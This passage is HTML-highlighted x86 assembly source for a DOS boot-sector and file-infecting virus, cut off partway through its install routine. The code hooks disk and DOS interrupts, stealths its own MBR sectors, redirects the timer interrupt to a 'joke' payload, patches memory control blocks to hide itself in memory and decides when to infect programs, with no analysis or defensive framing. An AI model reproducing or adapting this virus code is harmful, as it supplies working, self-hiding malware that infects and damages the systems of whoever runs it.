    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i8</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; 08h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i8</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Set int 13 to us</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new13</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Joke</span><span class="sc0">      </span><span class="sc1">; Set int 8 to our joke</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Allow</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; No allowance of infection</span><span class="sc0">
                    </span><span class="sc1">; until Command.Com is loaded</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Checked</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; No int changed</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IntInf</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">NoInt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Allow usage of int 21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">            </span><span class="sc1">; Load real MBR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Slen</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Store offset</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                </span><span class="sc1">; Go to it</span><span class="sc0">

</span><span class="sc5">Checked</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">New13</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; Write ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">OrWrite</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; Read  ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotRead</span><span class="sc0">
</span><span class="sc5">OrWrite</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">            </span><span class="sc1">; HDD ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotRead</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Slen</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Our sectors ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NotRead</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">iCheck</span><span class="sc0">           </span><span class="sc1">; Not our brother ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NotRead</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Slen</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Stealth it !</span><span class="sc0">
</span><span class="sc5">NotRead</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">i13</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Our1C</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Checked</span><span class="sc4">],</span><span class="sc5">IntChange</span><span class="sc0">  </span><span class="sc1">; If there were IntChange changes ?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoBump</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">; Store regs</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Ds = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current int 21</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoChange</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; Changed ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoChange</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Move it to our variables</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">r21</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; And again...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">r21</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Checked</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Increase number of int changes</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Checked</span><span class="sc4">],</span><span class="sc5">IntChange</span><span class="sc0">  </span><span class="sc1">; Equal ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoChange</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">28h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get int 28</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old28</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old28</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Yeap... No trace...</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New21</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; Intercept int 21h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i28</span><span class="sc0">       </span><span class="sc1">; Intercept int 28h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">BootDos</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">PatchMCB</span><span class="sc0">           </span><span class="sc1">; Patch our MCB</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

</span><span class="sc5">NoChange</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">NoBump</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">BootDos</span><span class="sc0">
</span><span class="sc5">PatchMCB</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">          </span><span class="sc1">; Get first MCB</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindZ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">; Find Last MCB</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Gotit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindZ</span><span class="sc0">

</span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">     </span><span class="sc1">; Make it not last</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Create our block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">          </span><span class="sc1">; Last block</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">          </span><span class="sc1">; Dos block</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">KbMem</span><span class="sc4">*</span><span class="sc2">64</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Occupied space</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchMCB</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

</span><span class="sc9">EndIf</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Inst</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Inst</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A1B1h</span><span class="sc0">               </span><span class="sc1">; Installation check</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lets_go</span><span class="sc0">           </span><span class="sc1">; Lets install</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bailout</span><span class="sc0">             </span><span class="sc1">; Nope....</span><span class="sc0">
                    </span><span class="sc1">; Virus would patch up offset of</span><span class="sc0">
                    </span><span class="sc1">; return, so it would pass first jmp</span><span class="sc0">
                    </span><span class="sc1">; (jmp short lets_go)...</span><span class="sc0">
</span><span class="sc5">lets_go</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f1</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; We're not traced...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TunnelTry</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; We're not tried to tunnel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">NoInt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Es = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get ints</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">i21</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; I21 h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; 8h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; 28h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old28</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old28</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoStInt21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">TryToGetInt21</span><span class="sc0">      </span><span class="sc1">; Lets get from int 21 PSP</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">; Lets get int 30h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">TryToGetInt21</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">host</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; Host sys ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SyS_HosT</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">allow</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; If no - we could infect</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Done_with_Host</span><span class="sc0">

</span><span class="sc5">SyS_HosT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">allow</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Sys... No infection until loaded</span><span class="sc0">
                    </span><span class="sc1">; Command.com</span><span class="sc0">

</span><span class="sc5">Done_With_Host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">          </span><span class="sc1">; Find first MCB</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">find_block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">; Find block, which size is more then</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">GotCha</span><span class="sc0">           </span><span class="sc1">; 65000 kb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">; Last ? Blah... No block :(</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Mux</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">BailOut</span><span class="sc0">
</span><span class="sc5">Mux</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_block</span><span class="sc0">
</span><span class="sc5">GotCha</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
